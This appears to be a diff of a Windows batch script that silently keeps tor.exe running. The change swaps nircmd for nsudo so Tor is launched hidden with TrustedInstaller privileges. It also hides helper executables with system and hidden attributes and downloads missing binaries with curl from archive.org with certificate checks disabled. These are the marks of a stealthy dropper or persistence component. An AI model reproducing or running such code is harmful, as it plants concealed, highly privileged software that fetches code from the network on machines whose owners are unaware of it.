@@ -23,13 +23,13 @@ attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (echo) else (
-  "%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
+  "%environment%\nsudo.exe" -U:T -P:E -ShowWindowMode:Hide "%environment%\tor.exe" && timeout -t 30
 )
 
-attrib -s -h -i "%environment%\nircmd.exe" && if exist "%environment%\nircmd.exe" (
-   attrib +s +h +i "%environment%\nircmd.exe"
+attrib -s -h -i "%environment%\nsudo.exe" && if exist "%environment%\nsudo.exe" (
+   attrib +s +h +i "%environment%\nsudo.exe"
 ) else (
-"%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
+"%environment%\curl.exe" -k -L https://archive.org/download/nsudo_201706/nsudo.exe -o "%environment%\nsudo.exe" && attrib +s +h +i "%environment%\nsudo.exe"
 )
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
